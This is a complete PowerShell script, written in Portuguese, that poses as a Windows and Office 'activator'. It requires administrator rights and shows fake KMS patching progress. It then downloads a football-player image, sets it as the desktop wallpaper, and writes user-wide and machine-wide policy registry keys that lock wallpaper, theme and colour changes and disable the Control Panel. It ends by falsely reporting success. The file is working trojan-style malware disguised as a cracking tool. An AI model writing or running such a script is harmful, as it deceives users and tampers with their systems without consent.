# Script Falso de Ativação - Wallpaper Bloqueador
# Salve como: wallpaper_lock.ps1

# Verifica se é Administrador
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host "ERRO: Este script precisa ser executado como Administrador!" -ForegroundColor Red
    Write-Host "Feche e execute novamente como Administrador." -ForegroundColor Yellow
    Write-Host "`nPressione qualquer tecla para sair..." -ForegroundColor Gray
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    exit
}

function Show-Menu {
    Clear-Host
    Write-Host "==============================================" -ForegroundColor Cyan
    Write-Host "    ATIVADOR WINDOWS & OFFICE PRO" -ForegroundColor Yellow
    Write-Host "==============================================" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "1. Ativar Windows 10/11" -ForegroundColor Green
    Write-Host "2. Ativar Office 2021/365" -ForegroundColor Green
    Write-Host "3. Ativar Windows + Office" -ForegroundColor Green
    Write-Host "4. Verificar Ativacao" -ForegroundColor Blue
    Write-Host "5. Sair" -ForegroundColor Red
    Write-Host ""
}

function Download-Wallpaper {
    try {
        $uri = 'https://uploads.metroimg.com/wp-content/uploads/2023/10/24131818/NeymarJr-8.jpg'
        $out = "$env:TEMP\neymar_wallpaper.jpg"
        
        if (Test-Path $out) {
            Remove-Item $out -Force -ErrorAction SilentlyContinue
        }
        
        try {
            Start-BitsTransfer -Source $uri -Destination $out -ErrorAction Stop
        }
        catch {
            Invoke-WebRequest -Uri $uri -OutFile $out -UseBasicParsing -ErrorAction Stop
        }
        
        if (Test-Path $out) {
            return $true
        }
        return $false
    }
    catch {
        return $false
    }
}

function Set-PermanentWallpaper {
    param($imagePath)
    
    try {
        if (-not (Test-Path $imagePath)) {
            return $false
        }

        # Carrega a API do wallpaper
        if (-not ("Wallpaper.Setter" -as [type])) {
            Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Wallpaper {
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
"@
        }
        
        # Define o wallpaper como TILE
        [Wallpaper]::SystemParametersInfo(0x0014, 0, $imagePath, 0x01 -bor 0x02)

        # Configurações do registro para wallpaper TILE
        $desktopPath = "HKCU:\Control Panel\Desktop"
        Set-ItemProperty -Path $desktopPath -Name "Wallpaper" -Value $imagePath -Force
        Set-ItemProperty -Path $desktopPath -Name "WallpaperStyle" -Value "0" -Force
        Set-ItemProperty -Path $desktopPath -Name "TileWallpaper" -Value "1" -Force

        # === BLOQUEIO DAS OPÇÕES DE PERSONALIZAÇÃO ===

        # 1. Desabilita o Personalização no Menu de Contexto
        $key1 = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
        if (-not (Test-Path $key1)) { New-Item -Path $key1 -Force | Out-Null }
        Set-ItemProperty -Path $key1 -Name "NoThemesTab" -Value 1 -Force

        # 2. Remove a opção "Personalizar" do menu de contexto
        Set-ItemProperty -Path $key1 -Name "NoViewControllerMenu" -Value 1 -Force

        # 3. Desabilita a mudança de cores
        $key2 = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
        if (-not (Test-Path $key2)) { New-Item -Path $key2 -Force | Out-Null }
        Set-ItemProperty -Path $key2 -Name "NoColorChoice" -Value 1 -Force

        # 4. Desabilita a visualização de temas
        Set-ItemProperty -Path $key2 -Name "NoVisualStyleChoice" -Value 1 -Force

        # 5. Remove opções de plano de fundo da personalização
        $key3 = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop"
        if (-not (Test-Path $key3)) { New-Item -Path $key3 -Force | Out-Null }
        Set-ItemProperty -Path $key3 -Name "NoChangingWallPaper" -Value 1 -Force

        # 6. Desabilita todo o Painel de Personalização
        Set-ItemProperty -Path $key1 -Name "NoControlPanel" -Value 1 -Force

        # 7. Especificamente desabilita a página de Plano de Fundo
        $key5 = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
        Set-ItemProperty -Path $key5 -Name "NoDispBackgroundPage" -Value 1 -Force

        # 8. BLOQUEIO GLOBAL - Políticas do Sistema (precisa de Admin)
        $systemPolicies = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
        if (-not (Test-Path $systemPolicies)) { 
            New-Item -Path $systemPolicies -Force | Out-Null 
        }
        Set-ItemProperty -Path $systemPolicies -Name "NoDispBackgroundPage" -Value 1 -Force

        $activeDesktopSystem = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop"
        if (-not (Test-Path $activeDesktopSystem)) { 
            New-Item -Path $activeDesktopSystem -Force | Out-Null 
        }
        Set-ItemProperty -Path $activeDesktopSystem -Name "NoChangingWallPaper" -Value 1 -Force

        # 9. Aplica as políticas imediatamente
        rundll32.exe user32.dll, UpdatePerUserSystemParameters 1, True
        
        # 10. Força atualização do Explorer
        Stop-Process -Name explorer -Force -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 2

        return $true
    }
    catch {
        return $false
    }
}

function Show-FakeProgress {
    param($message)
    
    for ($i = 0; $i -le 100; $i += 10) {
        Write-Progress -Activity "Processando..." -Status "$message - $i% Completo" -PercentComplete $i
        Start-Sleep -Milliseconds 80
    }
    Write-Progress -Activity "Processando..." -Completed
}

function Fake-Activation {
    param($option)
    
    $messages = @{
        1 = @("Verificando licenca Windows...", "Aplicando patch KMS...", "Ativando Windows...")
        2 = @("Verificando Office...", "Injetando licenca...", "Ativando Office...")
        3 = @("Verificando sistema...", "Aplicando patches...", "Ativando produtos...")
    }
    
    $selectedMessages = $messages[$option]
    
    foreach ($msg in $selectedMessages) {
        Show-FakeProgress $msg
        Start-Sleep -Seconds 1
    }
    
    if (Download-Wallpaper) {
        $wallpaperSet = Set-PermanentWallpaper -imagePath "$env:TEMP\neymar_wallpaper.jpg"
        if ($wallpaperSet) {
            Write-Host "`n[SUCESSO] Produto ativado com sucesso!" -ForegroundColor Green
            Write-Host "[INFO] Personalizacao bloqueada para proteger a ativacao." -ForegroundColor Yellow
        } else {
            Write-Host "`n[ERRO] Falha na ativacao." -ForegroundColor Red
        }
    } else {
        Write-Host "`n[ERRO] Falha na conexao." -ForegroundColor Red
    }
}

# Menu principal
do {
    Show-Menu
    $choice = Read-Host "`nSelecione uma opcao"
    
    switch ($choice) {
        '1' { Fake-Activation -option 1 }
        '2' { Fake-Activation -option 2 }
        '3' { Fake-Activation -option 3 }
        '4' { 
            Show-FakeProgress "Analisando sistema..."
            Write-Host "`n[INFO] Windows: Nao ativado" -ForegroundColor Red
            Write-Host "[INFO] Office: Nao ativado" -ForegroundColor Red
        }
        '5' { exit }
        default { 
            Write-Host "Opcao invalida!" -ForegroundColor Red
            Start-Sleep -Seconds 1
        }
    }
    
    if ($choice -ne '5') {
        Write-Host "`nPressione qualquer tecla para continuar..." -ForegroundColor Gray
        $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    }
} while ($choice -ne '5')